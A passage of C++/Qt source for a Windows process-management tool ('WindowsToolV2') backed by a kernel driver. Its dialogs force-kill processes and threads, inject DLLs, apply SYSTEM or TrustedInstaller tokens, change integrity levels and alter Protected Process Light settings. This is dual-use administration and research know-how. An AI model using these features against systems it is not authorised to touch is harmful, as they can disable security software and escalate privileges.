        AddMenuAction(Menu, "Resume", [this, SelectedPids] { int Count = 0; for (DWORD SelectedPid : SelectedPids) if (Resume(SelectedPid)) ++Count; ShowSuccessNotice(this, "Resume", QString("%1 of %2 process(es) resumed.").arg(Count).arg(SelectedPids.size())); });

        AddMenuAction(Menu, "SetToken", [this, Pid] { ShowTokenDialog(Pid); });

        auto *DetailMenu = new RoundMenu("Detail Information", Menu);
        AddMenuAction(DetailMenu, "Inspector", [this, Pid] { ShowProcessInspector(Pid); });
        AddMenuAction(DetailMenu, "ModuleList", [this, Pid] { ShowModuleList(Pid); });
        AddMenuAction(DetailMenu, "PEB", [this, Pid] { ShowPebDetails(Pid); });
        Menu->addMenu(DetailMenu);

        AddMenuAction(Menu, "InjectDLL", [this, Pid] { ShowInjectDllDialog(Pid); });

        ReleaseMenuAfterClose(Menu);
        Menu->exec(ProcessTable->viewport()->mapToGlobal(Position));
    }

    void ShowChoiceDialog(const QString &TitleText, const QString &DescriptionText,
                          const QStringList &Choices, std::function<void(int)> Handler,
                          QWidget *ParentWindow = nullptr)
    {
        auto *Dialog = new MessageBoxBase(ParentWindow ? ParentWindow : window());
        Dialog->setAttribute(Qt::WA_DeleteOnClose);
        auto *Title = MakeLabel(TitleText, 18, KTextPrimary, QFont::DemiBold);
        auto *Description = MakeLabel(DescriptionText, 11, KTextMuted);
        Description->setWordWrap(true);
        auto *ChoiceLabel = MakeLabel("Operation", 11, KTextPrimary, QFont::DemiBold);
        auto *Choice = new ComboBox;
        Choice->addItems(Choices);
        Choice->setCurrentIndex(0);
        Choice->setMinimumWidth(360);
        Dialog->viewLayout()->addWidget(Title);
        Dialog->viewLayout()->addWidget(Description);
        Dialog->viewLayout()->addSpacing(8);
        Dialog->viewLayout()->addWidget(ChoiceLabel);
        Dialog->viewLayout()->addWidget(Choice);
        Dialog->yesButton()->setText("Execute");
        Dialog->cancelButton()->setText("Cancel");
        QObject::connect(Dialog->yesButton(), &QPushButton::clicked, Dialog,
                         [Dialog, Choice, Handler = std::move(Handler)] {
            const int Index = Choice->currentIndex();
            Dialog->accept();
            Handler(Index);
        });
        QObject::connect(Dialog->cancelButton(), &QPushButton::clicked, Dialog, &QDialog::reject);
        Dialog->show();
    }

    void ShowTerminateDialog(const std::vector<DWORD> &Pids)
    {
        ShowChoiceDialog("Terminate",
                         QString("Select how to terminate %1 selected process(es). This may cause data loss.").arg(Pids.size()),
                         {"R0ZwTerminateProcess", "R3PatchThreadRun", "R3NtTerminate",
                          "R3KillProcessForce", "R3RunInjectProc"},
                         [this, Pids](int Index) {
            int SuccessCount = 0;
            for (const DWORD Pid : Pids)
            {
                bool Success = false;
                switch (Index)
                {
                case 0:
                    KillProcess(Pid);
                    Success = G_LastMultiDrvError == ERROR_SUCCESS;
                    break;
                case 1:
                    PatchThreadRun(Pid);
                    Success = true;
                    break;
                case 2:
                    Success = NtTerminate(Pid);
                    break;
                case 3:
                    Success = KillProcessForce(Pid);
                    break;
                case 4:
                    Success = RunInjectProc(Pid);
                    break;
                default:
                    return;
                }
                if (Success)
                    ++SuccessCount;
            }
            if (SuccessCount == 0)
                ShowErrorNotice(this, "Terminate", "Unable to terminate the selected processes.");
            else
                ShowSuccessNotice(this, "Terminate",
                                  QString("%1 of %2 process(es) processed.").arg(SuccessCount).arg(Pids.size()));
            QTimer::singleShot(0, this, [this] { RefreshProcesses(); });
        });
    }

    void ShowTerminateDialog(DWORD Pid, const QString &Name)
    {
        ShowChoiceDialog("Terminate",
                         QString("Select how to terminate %1 (PID %2). This may cause data loss.").arg(Name).arg(Pid),
                         {"R0ZwTerminateProcess", "R3PatchThreadRun", "R3NtTerminate",
                          "R3KillProcessForce", "R3RunInjectProc"},
                         [this, Pid](int Index) {
            switch (Index)
            {
            case 0:
                KillProcess(Pid);
                ReportDriverResult("Terminate");
                return;
            case 1:
                PatchThreadRun(Pid);
                ShowSuccessNotice(this, "Terminate", "Thread execution patch requested.");
                break;
            case 2:
                if (!NtTerminate(Pid))
                    ShowErrorNotice(this, "Terminate", "NtTerminateProcess failed.");
                else
                    ShowSuccessNotice(this, "Terminate", "Process terminated.");
                break;
            case 3:
                if (!KillProcessForce(Pid))
                    ShowErrorNotice(this, "Terminate", "Thread termination failed.");
                else
                    ShowSuccessNotice(this, "Terminate", "Process threads terminated.");
                break;
            case 4:
                if (!RunInjectProc(Pid))
                    ShowErrorNotice(this, "Terminate", "Remote ExitProcess failed.");
                else
                    ShowSuccessNotice(this, "Terminate", "Remote ExitProcess completed.");
                break;
            default:
                return;
            }
            QTimer::singleShot(0, this, [this] { RefreshProcesses(); });
        });
    }

    void ShowIntegrityDialog(DWORD Pid)
    {
        ShowChoiceDialog("Set Integrity", QString("Select the integrity level for PID %1.").arg(Pid),
                         {"Untrusted", "Low", "Medium", "High", "System", "Protected"},
                         [this, Pid](int Index) {
            static const std::array<const wchar_t *, 6> Levels{
                L"S-1-16-0", L"S-1-16-4096", L"S-1-16-8192", L"S-1-16-12288",
                L"S-1-16-16384", L"S-1-16-20480"};
            if (Index < 0 || Index >= static_cast<int>(Levels.size()))
                return;
            if (!SetIntegrity(Pid, Levels[Index]))
                ShowErrorNotice(this, "Set Integrity", "SetTokenInformation failed.");
            else
                ShowSuccessNotice(this, "Set Integrity", "Integrity level updated.");
            QTimer::singleShot(0, this, [this] { RefreshProcesses(); });
        });
    }

    void ShowTokenDialog(DWORD Pid)
    {
        ShowChoiceDialog("SetToken", QString("Select the account token to apply to PID %1.").arg(Pid),
                         {"SYSTEM", "TRUSTEDINSTALLER"}, [this, Pid](int Index) {
            const ULONG AccountType = Index == 0 ? ACCOUNT_TYPE_SYSTEM : ACCOUNT_TYPE_TRUSTEDINSTALLER;
            if (!SetTokenAs(AccountType, Pid))
                ShowErrorNotice(this, "SetToken", DescribeSetTokenError(G_LastMultiDrvError));
            else
                ShowSuccessNotice(this, "SetToken", Index == 0 ? "SYSTEM token applied."
                                                                  : "TrustedInstaller token applied.");
            QTimer::singleShot(0, this, [this] { RefreshProcesses(); });
        });
    }

    void ShowApcSignalDialog(DWORD Pid)
    {
        ShowChoiceDialog("SendAPCSignal", QString("Select the APC signal for PID %1.").arg(Pid),
                         {"NoOp", "Terminate"}, [this, Pid](int Index) {
            static const std::array<ULONG, 2> Actions{
                APC_ACTION_NOOP, APC_ACTION_TERMINATE};
            if (Index < 0 || Index >= static_cast<int>(Actions.size()))
                return;
            QueueApc(Pid, Actions[Index]);
            ReportDriverResult("APC");
        });
    }

    void ConfigurePpl(DWORD Pid)
    {
        auto *Dialog = new MessageBoxBase(window());
        Dialog->setAttribute(Qt::WA_DeleteOnClose);
        auto *Title = MakeLabel("SetPPL", 18, KTextPrimary, QFont::DemiBold);
        auto *Description = MakeLabel(QString("Configure protected process light settings for PID %1.").arg(Pid),
                                      11, KTextMuted);
        auto *TypeLabel = MakeLabel("Protection type", 11, KTextPrimary, QFont::DemiBold);
        auto *Type = new ComboBox;
        Type->addItems({"None", "ProtectedLight", "Protected"});
        Type->setCurrentIndex(0);
        auto *SignerLabel = MakeLabel("Signer", 11, KTextPrimary, QFont::DemiBold);
        auto *Signer = new ComboBox;
        Signer->addItems({"None", "Authenticode", "CodeGen", "Antimalware", "Lsa", "Windows", "WinTcb", "WinSystem", "App"});
        Signer->setCurrentIndex(0);
        auto *AuditLabel = MakeLabel("Audit", 11, KTextPrimary, QFont::DemiBold);
        auto *Audit = new ComboBox;
        Audit->addItems({"Off", "On"});
        Audit->setCurrentIndex(0);
        Dialog->viewLayout()->addWidget(Title);
        Dialog->viewLayout()->addWidget(Description);
        Dialog->viewLayout()->addSpacing(8);
        Dialog->viewLayout()->addWidget(TypeLabel);
        Dialog->viewLayout()->addWidget(Type);
        Dialog->viewLayout()->addWidget(SignerLabel);
        Dialog->viewLayout()->addWidget(Signer);
        Dialog->viewLayout()->addWidget(AuditLabel);
        Dialog->viewLayout()->addWidget(Audit);
        Dialog->yesButton()->setText("Apply");
        Dialog->cancelButton()->setText("Cancel");
        QObject::connect(Dialog->yesButton(), &QPushButton::clicked, Dialog,
                         [this, Dialog, Type, Signer, Audit, Pid] {
            SetPpl(Pid, static_cast<UCHAR>(Type->currentIndex()),
                   static_cast<UCHAR>(Signer->currentIndex()), Audit->currentIndex() == 1);
            Dialog->accept();
            ReportDriverResult("SetPPL");
        });
        QObject::connect(Dialog->cancelButton(), &QPushButton::clicked, Dialog, &QDialog::reject);
        Dialog->show();
    }

    void ShowProcessInspector(DWORD Pid)
    {
        const ProcessRow *SelectedProcess = FindProcess(Pid);
        const QString ProcessName = SelectedProcess && !SelectedProcess->Name.isEmpty()
            ? SelectedProcess->Name : QString("Process %1").arg(Pid);
        auto *Dialog = new QDialog(this);
        Dialog->setAttribute(Qt::WA_DeleteOnClose);
        Dialog->setWindowTitle(QString("%1 - Process Inspector").arg(ProcessName));
        Dialog->resize(1180, 800);
        Dialog->setMinimumSize(900, 620);
        auto *Layout = new QVBoxLayout(Dialog);
        Layout->setContentsMargins(22, 20, 22, 18);
        Layout->setSpacing(14);

        auto *Header = new QWidget;
        auto *HeaderLayout = new QHBoxLayout(Header);
        HeaderLayout->setContentsMargins(0, 0, 0, 0);
        HeaderLayout->setSpacing(14);
        auto *IconHost = new QWidget;
        IconHost->setFixedSize(48, 48);
        const QColor Accent = ConfiguredColor("AccentColor", KAccent);
        IconHost->setStyleSheet(QString("background: rgba(%1,%2,%3,%4); border-radius: 8px;")
            .arg(Accent.red()).arg(Accent.green()).arg(Accent.blue()).arg(42));
        auto *IconLayout = new QVBoxLayout(IconHost);
        IconLayout->setContentsMargins(0, 0, 0, 0);
        IconLayout->addWidget(MakeGlyph(Fluent::IconType::APPLICATION, 24), 0, Qt::AlignCenter);
        HeaderLayout->addWidget(IconHost);
        auto *IdentityLayout = new QVBoxLayout;
        IdentityLayout->setContentsMargins(0, 1, 0, 1);
        IdentityLayout->setSpacing(3);
        IdentityLayout->addWidget(MakeLabel(ProcessName, 18, KTextPrimary, QFont::DemiBold));
        IdentityLayout->addWidget(MakeLabel(QString("PID %1").arg(Pid), 11, KTextMuted, QFont::Medium));
        HeaderLayout->addLayout(IdentityLayout, 1);
        auto *Loading = new IndeterminateProgressRing(Dialog, false);
        Loading->setFixedSize(22, 22);
        Loading->start();
        auto *LoadStatus = new BodyLabel("Reading process data...");
        HeaderLayout->addWidget(Loading);
        HeaderLayout->addWidget(LoadStatus);
        Layout->addWidget(Header);

        auto *InspectorSearch = new SearchLineEdit;
        InspectorSearch->setPlaceholderText("Search the current process details");
        InspectorSearch->setClearButtonEnabled(true);
        InspectorSearch->setMaximumWidth(460);
        Layout->addWidget(InspectorSearch);

        auto *Tabs = new TabBar;
        Tabs->setAddButtonVisible(false);
        Tabs->setTabsClosable(false);
        Tabs->setMovable(false);
        auto *Pages = new QStackedWidget;
        Layout->addWidget(Tabs);
        Layout->addWidget(Pages, 1);

        const auto AddTable = [Tabs, Pages](const QString &Key, const QString &Name,
                                            Fluent::IconType Icon, const QStringList &Columns) {
            auto *Table = MakeTable(Columns);
            Table->setSortingEnabled(false);
            Table->setTextElideMode(Qt::ElideRight);
            Table->horizontalHeader()->setStretchLastSection(true);
            Tabs->addTab(Key, Name, Icon);
            Pages->addWidget(Table);
            return Table;
        };
        auto *Summary = AddTable("summary", "Summary", Fluent::IconType::INFO, {"Field", "Value"});
        Summary->horizontalHeader()->setSectionResizeMode(0, QHeaderView::ResizeToContents);
        Summary->horizontalHeader()->setSectionResizeMode(1, QHeaderView::Stretch);
        const auto AddSummaryRow = [Summary](const QString &Field, const QString &Value) {
            const int Row = Summary->rowCount();
            Summary->insertRow(Row);
            Summary->setItem(Row, 0, new QTableWidgetItem(Field));
            Summary->setItem(Row, 1, new QTableWidgetItem(Value));
            Summary->setRowHeight(Row, 36);
        };
        if (SelectedProcess)
        {
            AddSummaryRow("PID", QString::number(SelectedProcess->Pid));
            AddSummaryRow("Image", SelectedProcess->Name);
            AddSummaryRow("User", SelectedProcess->User);
            AddSummaryRow("Integrity", IntegrityName(SelectedProcess->IntegrityRid));
            AddSummaryRow("Parent PID", QString::number(SelectedProcess->ParentPid));
            AddSummaryRow("Threads", QString::number(SelectedProcess->ThreadCount));
            AddSummaryRow("Handles", SelectedProcess->HandleCountAvailable
                ? QString::number(SelectedProcess->HandleCount)
                : QString("Unavailable (error %1)").arg(SelectedProcess->HandleCountError));
            AddSummaryRow("Session", QString::number(SelectedProcess->SessionId));
            AddSummaryRow("Tool protection", SelectedProcess->Protected ? "Yes" : "No");
            AddSummaryRow("PPL", SelectedProcess->Ppl
                ? QString("Yes (0x%1)").arg(SelectedProcess->PplRaw, 2, 16, QLatin1Char('0')).toUpper()
                : "No");
            AddSummaryRow("Critical", SelectedProcess->Critical ? "Yes" : "No");
            AddSummaryRow("Hidden", SelectedProcess->Hidden ? "Yes" : "No");
            AddSummaryRow("Enumeration", SelectedProcess->DriverData ? "Kernel driver" : "Toolhelp fallback");
        }
        auto *Token = AddTable("token", "Token", Fluent::IconType::CERTIFICATE, {"Category", "Name", "SID", "Attributes"});
        auto *Threads = AddTable("threads", "Threads", Fluent::IconType::PEOPLE, {"TID", "Start", "Priority", "State", "Wait", "CPU time"});
        Threads->setContextMenuPolicy(Qt::CustomContextMenu);
        Threads->setSelectionMode(QAbstractItemView::ExtendedSelection);
        Threads->setProperty("UseGenericDetailDialog", false);
        auto *Handles = AddTable("handles", "Handles", Fluent::IconType::LINK, {"Handle", "Object", "Type", "Access", "Attributes"});
        auto *Modules = AddTable("modules", "Modules", Fluent::IconType::LIBRARY, {"Name", "Base", "Size", "Path", "Source"});
        auto *Memory = AddTable("memory", "Memory", Fluent::IconType::TILES, {"Base", "Size", "State", "Protect", "Type"});
        auto *Mitigations = AddTable("mitigations", "Mitigations", Fluent::IconType::CERTIFICATE, {"Property", "Value", "Source"});
        auto *PebText = new PlainTextEdit;
        PebText->setReadOnly(true);
        PebText->setFont(QFont("Cascadia Mono", 10));
        PebText->setPlaceholderText("PEB data is unavailable.");
        InstallFluentScrollBar(PebText, Qt::Vertical);
        Tabs->addTab("peb", "PEB", Fluent::IconType::CODE);
        Pages->addWidget(PebText);
        const std::array<QTableWidget *, 7> InspectorTables{
            Summary, Token, Threads, Handles, Modules, Memory, Mitigations};
        const auto ApplyInspectorSearch = [InspectorSearch, Pages, PebText, InspectorTables] {
            const QString Query = InspectorSearch->text().trimmed();
            for (QTableWidget *Table : InspectorTables)
            {
                for (int Row = 0; Row < Table->rowCount(); ++Row)
                {
                    QString RowText;
                    for (int Column = 0; Column < Table->columnCount(); ++Column)
                    {
                        if (const QTableWidgetItem *Item = Table->item(Row, Column))
                            RowText += Item->text() + QLatin1Char(' ');
                    }
                    Table->setRowHidden(Row, !Query.isEmpty() &&
                        !RowText.contains(Query, Qt::CaseInsensitive));
                }
            }
            if (Pages->currentWidget() == PebText && !Query.isEmpty())
            {
                PebText->moveCursor(QTextCursor::Start);
                PebText->find(Query);
            }
        };
        QObject::connect(Tabs, &TabBar::currentChanged, Pages, &QStackedWidget::setCurrentIndex);
        QObject::connect(Pages, &QStackedWidget::currentChanged, Tabs, &TabBar::setCurrentIndex);
        QObject::connect(InspectorSearch, &QLineEdit::textChanged, Dialog,
                         [ApplyInspectorSearch](const QString &) { ApplyInspectorSearch(); });
        QObject::connect(Pages, &QStackedWidget::currentChanged, Dialog,
                         [ApplyInspectorSearch](int) { ApplyInspectorSearch(); });
        QObject::connect(Threads, &QWidget::customContextMenuRequested, Dialog,
                         [this, Dialog, Threads, Pid](const QPoint &Position) {
            const QModelIndex Index = Threads->indexAt(Position);
            if (!Index.isValid())
                return;
            if (!Threads->selectionModel()->isRowSelected(Index.row(), QModelIndex()))
            {
                Threads->clearSelection();
                Threads->selectRow(Index.row());
            }
            const QTableWidgetItem *TidItem = Threads->item(Index.row(), 0);
            if (!TidItem)
                return;
            const DWORD Tid = TidItem->data(Qt::UserRole).toUInt();
            if (Tid == 0)
                return;
            std::vector<DWORD> SelectedTids;
            for (const QModelIndex &Selected : Threads->selectionModel()->selectedRows(0))
            {
                const QTableWidgetItem *Item = Threads->item(Selected.row(), 0);
                if (Item && Item->data(Qt::UserRole).toUInt() != 0)
                    SelectedTids.push_back(Item->data(Qt::UserRole).toUInt());
            }
            if (SelectedTids.empty())
                return;

            auto *Menu = new RoundMenu(QString(), Dialog);
            AddMenuAction(Menu, "Terminate", [this, Dialog, Threads, Pid, SelectedTids] {
                if (Pid == GetCurrentProcessId())
                {
                    ShowWarningNotice(this, "Terminate thread",
                                      "Thread operations on WindowsToolV2 itself are disabled.");
                    return;
                }
                QPointer<QTableWidget> SafeThreads(Threads);
                ShowChoiceDialog("Terminate thread",
                                 QString("Select how to terminate %1 selected thread(s). Terminating threads can destabilize their process.").arg(SelectedTids.size()),
                                 {"R3 (Win32 API)", "R0 (MultiDrv)"},
                                 [this, SafeThreads, SelectedTids, Pid](int Method) {
                    int SuccessCount = 0;
                    DWORD LastErrorCode = ERROR_SUCCESS;
                    QString Mode;
                    for (const DWORD SelectedTid : SelectedTids)
                    {
                        bool Success = false;
                        if (Method == 0)
                        {
                            Mode = "R3";
                            EnableDebugPrivilege();
                            HANDLE Thread = OpenThread(THREAD_TERMINATE, FALSE, SelectedTid);
                            if (Thread)
                            {
                                if (::TerminateThread(Thread, 0) != FALSE)
                                {
                                    const DWORD WaitResult = WaitForSingleObject(Thread, 500);
                                    if (WaitResult == WAIT_OBJECT_0)
                                    {
                                        DWORD ExitCode = STILL_ACTIVE;
                                        if (GetExitCodeThread(Thread, &ExitCode) && ExitCode != STILL_ACTIVE)
                                        {
                                            Success = true;
                                        }
                                        else
                                        {
                                            LastErrorCode = ERROR_GEN_FAILURE;
                                        }
                                    }
                                    else if (WaitResult == WAIT_TIMEOUT)
                                    {
                                        LastErrorCode = WAIT_TIMEOUT;
                                    }
                                    else
                                    {
                                        LastErrorCode = GetLastError();
                                    }
                                }
                                else
                                {
                                    LastErrorCode = GetLastError();
                                }
                                CloseHandle(Thread);
                            }
                            else
                            {
                                LastErrorCode = GetLastError();
                            }
                        }
                        else
                        {
                            Mode = "R0";
                            Success = KillThread(SelectedTid, Pid) != FALSE;
                            if (!Success)
                                LastErrorCode = G_LastMultiDrvError;
                        }
                        if (Success)
                        {
                            ++SuccessCount;
                            if (SafeThreads)
                            {
                                for (int Row = 0; Row < SafeThreads->rowCount(); ++Row)
                                {
                                    const QTableWidgetItem *Item = SafeThreads->item(Row, 0);
                                    if (Item && Item->data(Qt::UserRole).toUInt() == SelectedTid)
                                    {
                                        SafeThreads->removeRow(Row);
                                        break;
                                    }
                                }
                            }
                        }
                    }
                    if (SuccessCount == 0)
                        ShowErrorNotice(this, "Terminate thread", QString("%1 termination failed (error %2).").arg(Mode).arg(LastErrorCode));
                    else
                        ShowSuccessNotice(this, "Terminate thread", QString("%1 of %2 thread(s) processed through %3.").arg(SuccessCount).arg(SelectedTids.size()).arg(Mode));
                }, Dialog);
            });

            const auto ChangeSuspendState = [this, Pid, SelectedTids](bool Suspend) {
                if (Pid == GetCurrentProcessId())
                {
                    ShowWarningNotice(this, Suspend ? "Suspend thread" : "Resume thread",
                                      "Thread operations on WindowsToolV2 itself are disabled.");
                    return;
                }
                EnableDebugPrivilege();
                int SuccessCount = 0;
                DWORD LastErrorCode = ERROR_SUCCESS;
                for (const DWORD SelectedTid : SelectedTids)
                {
                    HANDLE Thread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, SelectedTid);
                    if (!Thread)
                    {
                        LastErrorCode = GetLastError();
                        continue;
                    }
                    const DWORD PreviousCount = Suspend ? ::SuspendThread(Thread) : ::ResumeThread(Thread);
                    if (PreviousCount != static_cast<DWORD>(-1))
                        ++SuccessCount;
                    else
                        LastErrorCode = GetLastError();
                    CloseHandle(Thread);
                }
                if (SuccessCount == 0)
                {
                    ShowErrorNotice(this, Suspend ? "Suspend thread" : "Resume thread",
                                    QString("Operation failed (error %1).").arg(LastErrorCode));
                    return;
                }
                ShowSuccessNotice(this, Suspend ? "Suspend thread" : "Resume thread",
                                  QString("%1 of %2 selected thread(s) updated.")
                                      .arg(SuccessCount).arg(SelectedTids.size()));
            };
            AddMenuAction(Menu, "Suspend", [ChangeSuspendState] { ChangeSuspendState(true); });
            AddMenuAction(Menu, "Resume", [ChangeSuspendState] { ChangeSuspendState(false); });
            ReleaseMenuAfterClose(Menu);
            Menu->exec(Threads->viewport()->mapToGlobal(Position));
        });
        auto *Close = new PushButton("Close", Fluent::IconType::ACCEPT);
        Layout->addWidget(Close, 0, Qt::AlignRight);
        QObject::connect(Close, &QPushButton::clicked, Dialog, &QDialog::accept);
        Dialog->show();

        const bool HasSelectedProcess = SelectedProcess != nullptr;
        QPointer<QDialog> SafeDialog(Dialog);
        std::thread([SafeDialog, Pid, Summary, Token, Threads, Handles, Modules, Memory, Mitigations,
                     PebText, Loading, LoadStatus, InspectorSearch, HasSelectedProcess] {
            UserTokenInfo TokenInfo;
            const bool TokenOk = QueryUserTokenInfo(Pid, TokenInfo);
            std::vector<MDV2_RECORD> ProcessRows, ThreadRows, HandleRows, ModuleRows, MemoryRows;
            std::vector<InspectorHandleRow> UserHandleRows;
            MDV2_LIST_HEADER ProcessHeader{}, ThreadHeader{}, HandleHeader{}, ModuleHeader{}, MemoryHeader{};
            DWORD UserHandleError = ERROR_SUCCESS;
            QueryProcessRecordsV2(Pid, IOCTL_QUERY_PROCESS_V2, ProcessRows, &ProcessHeader);
            QueryProcessRecordsV2(Pid, IOCTL_ENUM_THREADS_V2, ThreadRows, &ThreadHeader);
            QueryProcessRecordsV2(Pid, IOCTL_ENUM_HANDLES_V2, HandleRows, &HandleHeader);
            QueryProcessRecordsV2(Pid, IOCTL_ENUM_MODULES_V2, ModuleRows, &ModuleHeader);
            QueryProcessRecordsV2(Pid, IOCTL_ENUM_MEMORY_V2, MemoryRows, &MemoryHeader);
            const bool UserHandleOk = QueryUserModeHandles(Pid, UserHandleRows, UserHandleError);
            std::string PebOutput;
            ProcessPeb::ReadPebInfoText(Pid, PebOutput);

            std::vector<std::tuple<ULONG, ULONG64, QString>> MitigationEntries;
            if (G_DeviceHandle != INVALID_HANDLE_VALUE)
            {
                BYTE MitBuf[4096] = {};
                ULONG MitReturned = 0;
                if (QueryMitigationKernel(Pid, MitBuf, sizeof(MitBuf), &MitReturned) && MitReturned >= sizeof(ULONG))
                {
                    PULONG Count = (PULONG)MitBuf;
                    PUCHAR Data = (PUCHAR)(Count + 1);
                    for (ULONG i = 0; i < *Count; i++)
                    {
                        ULONG Id = *(PULONG)Data; Data += 4;
                         ULONG64 Flags = *(ULONG64*)Data; Data += 8;
                        QString Name = QString::fromWCharArray((PWCHAR)Data);
                        Data += 64;
                        MitigationEntries.emplace_back(Id, Flags, Name);
                    }
                }
            }

            QMetaObject::invokeMethod(qApp, [SafeDialog, Summary, Token, Threads, Handles, Modules, Memory,
                                             Mitigations, PebText, Loading, LoadStatus, InspectorSearch,
                                             TokenInfo = std::move(TokenInfo), TokenOk,
                                             ProcessRows = std::move(ProcessRows), ThreadRows = std::move(ThreadRows),
                                             HandleRows = std::move(HandleRows), UserHandleRows = std::move(UserHandleRows),
                                             ModuleRows = std::move(ModuleRows), MemoryRows = std::move(MemoryRows),
                                              ProcessHeader, HandleHeader, ModuleHeader, UserHandleOk, UserHandleError,
                                              PebOutput = std::move(PebOutput), HasSelectedProcess,
                                              MitigationEntries = std::move(MitigationEntries), Pid]() mutable {
                if (!SafeDialog) return;
                const auto Add = [InspectorSearch](QTableWidget *Table, const QStringList &Values) {
                    const int Row = Table->rowCount(); Table->insertRow(Row);
                    for (int Column = 0; Column < Values.size(); ++Column) Table->setItem(Row, Column, new QTableWidgetItem(Values[Column]));
                    Table->setRowHeight(Row, 36);
                    const QString Query = InspectorSearch->text().trimmed();
                    Table->setRowHidden(Row, !Query.isEmpty() &&
                        !Values.join(QLatin1Char(' ')).contains(Query, Qt::CaseInsensitive));
                };
                const auto SourceName = [](ULONG Source) {
                    static const std::array<const char *, 10> Names{
                        "Unknown", "Public API", "System Info", "Object Manager", "Registry",
                        "Process Environment", "Memory Map", "Version Profile", "Signature Scan", "Cross-view"};
                    return Source < Names.size() ? QString::fromLatin1(Names[Source]) : QString("Source %1").arg(Source);
                };
                if (!ProcessRows.empty()) {
                    const auto &R = ProcessRows.front();
                    const QString KernelParentPid = QString::number(static_cast<quint32>(R.Value[0]));
                    const QString KernelThreads = QString::number(static_cast<quint32>(R.Value[1]));
                    const QString KernelHandles = QString::number(static_cast<quint32>(R.Value[2]));
                    const QString KernelSession = QString::number(static_cast<quint32>(R.Value[3]));
                    if (!HasSelectedProcess) {
                        Add(Summary, {"Parent PID", KernelParentPid});
                        Add(Summary, {"Threads", KernelThreads});
                        Add(Summary, {"Handles", KernelHandles});
                        Add(Summary, {"Session", KernelSession});
                    }
                    Add(Summary, {"EPROCESS", FormatTaskPointer(R.Address)});
                    if (R.Detail[0])
                        Add(Summary, {"UniqueProcessKey", QString::fromWCharArray(R.Detail)});
                    if (R.Value[4] != 0) {
                        LARGE_INTEGER CreateTime{};
                        CreateTime.QuadPart = static_cast<LONGLONG>(R.Value[4]);
                        Add(Summary, {"Create time", MonitorTimestamp(CreateTime)});
                    }
                    Add(Summary, {"User time", FormatProcessCpuTime(R.Value[5])});
                    Add(Summary, {"Kernel time", FormatProcessCpuTime(R.Value[6])});
                    Add(Summary, {"Working set", FormatBytes(R.SizeBytes)});
                    Add(Summary, {"Private bytes", FormatBytes(R.Value[7])});
                    if (R.Path[0])
                        Add(Summary, {"Path", QString::fromWCharArray(R.Path)});
                } else Add(Summary, {"Kernel query", QString("0x%1").arg(static_cast<quint32>(ProcessHeader.Status), 8, 16, QLatin1Char('0')).toUpper()});
                Add(Token, {"User", TokenOk ? TokenInfo.User : QString("Unavailable (%1)").arg(TokenInfo.Error), TokenInfo.UserSid,
                            TokenInfo.Elevated ? "Elevated" : "Not elevated"});
                Add(Token, {"Integrity", TokenInfo.Integrity, {}, {}});
                Add(Token, {"AppContainer", TokenInfo.AppContainer ? "Yes" : "No", TokenInfo.AppContainerSid, {}});
                for (const auto &Entry : TokenInfo.Entries) Add(Token, {Entry.Category, Entry.Name, Entry.Sid, Entry.Attributes});
                for (const auto &R : ThreadRows)
                {
                    const int Row = Threads->rowCount();
                    Add(Threads, {QString::number(R.ThreadId), QString("0x%1").arg(R.Address, 0, 16).toUpper(),
                        QString::number(R.Value[0]), QString::number(R.Value[2]), QString::number(R.Value[3]), QString::number(R.Value[6] + R.Value[7])});
                    if (QTableWidgetItem *Item = Threads->item(Row, 0))
                        Item->setData(Qt::UserRole, QVariant::fromValue<qulonglong>(R.ThreadId));
                }
                if (UserHandleOk && !UserHandleRows.empty())
                {
                    for (const auto &R : UserHandleRows)
                        Add(Handles, {QString("0x%1").arg(R.HandleValue, 0, 16).toUpper(),
                                      R.ObjectName.isEmpty() ? QString("0x%1").arg(R.ObjectAddress, 0, 16).toUpper() : R.ObjectName,
                                      R.TypeName.isEmpty() ? "Unknown" : R.TypeName,
                                      QString("0x%1").arg(R.GrantedAccess, 0, 16).toUpper(),
                                      QString("0x%1").arg(R.Attributes, 0, 16).toUpper()});
                    Add(Mitigations, {"Handle source", "User-mode fallback", QString::number(UserHandleRows.size())});
                }
                else
                {
                    for (const auto &R : HandleRows) Add(Handles, {QString("0x%1").arg(R.Value[0], 0, 16).toUpper(),
                        QString("0x%1").arg(R.Address, 0, 16).toUpper(), QString::number(R.Value[2]),
                        QString("0x%1").arg(R.Value[1], 0, 16).toUpper(), QString("0x%1").arg(R.Value[3], 0, 16).toUpper()});
                    if (HandleRows.empty())
                    {
                        if (HandleHeader.Status == 0 && UserHandleOk)
                            Add(Handles, {"No handles", {}, {}, {}, {}});
                        else if (HandleHeader.Status == 0)
                            Add(Handles, {"Unavailable", {}, {}, {}, QString("fallback error %1").arg(UserHandleError)});
                        else
                            Add(Handles, {"Unavailable", {}, {}, {},
                                QString("0x%1").arg(static_cast<quint32>(HandleHeader.Status), 8, 16, QLatin1Char('0')).toUpper()});
                    }
                    else
                    {
                        Add(Mitigations, {"Handle source", "Kernel driver", QString::number(HandleRows.size())});
                    }
                }
                Add(Mitigations, {"Kernel query", "Capability-dependent", SourceName(ProcessHeader.Source)});

                if (!MitigationEntries.empty())
                {
                    for (const auto &[Id, Flags, Name] : MitigationEntries)
                    {
                        QString FlagText = QString("0x%1").arg(Flags, 16, 16, QLatin1Char('0'));
                        QString Status = (Flags & 1) ? "Enabled" : "Disabled";
                        Add(Mitigations, {Name, FlagText + " (" + Status + ")", QString("PID %1").arg(Pid)});
                    }
                }
                else if (G_DeviceHandle != INVALID_HANDLE_VALUE)
                {
                    Add(Mitigations, {"Mitigation query", "No data / unsupported", {}});
                }
                PebText->setPlainText(QString::fromStdString(PebOutput));
                if (!InspectorSearch->text().trimmed().isEmpty())
                {
                    PebText->moveCursor(QTextCursor::Start);
                    PebText->find(InspectorSearch->text().trimmed());
                }
                for (QTableWidget *Table : {Summary, Token, Threads, Handles, Modules, Memory, Mitigations})
                    Table->setSortingEnabled(true);
                Loading->stop();
                Loading->hide();
                LoadStatus->setText(QString("%1 threads | %2 handles | %3 modules")
                    .arg(ThreadRows.size())
                    .arg(UserHandleOk && !UserHandleRows.empty() ? UserHandleRows.size() : HandleRows.size())
                    .arg(ModuleRows.size()));
            }, Qt::QueuedConnection);
        }).detach();
    }

    void ShowPebDetails(DWORD Pid)
    {
        std::string Output;
        if (!ProcessPeb::ReadPebInfoText(Pid, Output))
        {
            ShowErrorNotice(this, "PEB", "Unable to read the target process.");
            return;
        }
        auto *Dialog = new QDialog(this);
        Dialog->setAttribute(Qt::WA_DeleteOnClose);
